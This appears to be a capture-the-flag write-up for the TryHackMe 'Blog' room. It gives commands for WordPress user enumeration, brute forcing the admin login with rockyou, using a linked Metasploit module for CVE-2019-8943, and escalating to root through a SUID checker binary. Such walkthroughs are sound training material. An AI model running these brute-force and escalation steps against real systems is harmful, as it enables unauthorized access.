# Blog
[TryHackme room link](https://tryhackme.com/room/blog)

# Informations about the room
> Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...
In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.

# Open ports

SSH

HTTP

Smb

# Enumeration

Inside the Smb share there are 3 files, one Taylor Swift song and 2 photos

Nothing very interesting

There is wordpress on the server

Enumerating users with WPScan:

`wpscan --url blog.thm --enumerate u`

Two usernames are discovered:

```
kwheel
bjoel
```

This wordpress version, 5.0, is vulnerable to [CVE-2019-8943](https://nvd.nist.gov/vuln/detail/CVE-2019-8943), an Image Remote Code Execution vulnerability

There is a [metasploit module](https://www.exploit-db.com/exploits/46662) for this CVE but it needs credentials

So the only thing left is to bruteforce the wordpress admin panel

`wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U kwheel -t 75`

It finds a password:

```console
[!] Valid Combinations Found:
| Username: kwheel, Password: REDACTED
```

# Privilege escalation

After using the metasploit module we are user `www-data`

After enumerating SUID binaries

`find / -perm -u=s -type f 2>/dev/null`

We find a `/usr/sbin/checker`

It checks for a `admin` env var and if the value is 1 it spawns a root shell:

```console
export admin=1
/usr/sbin/checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
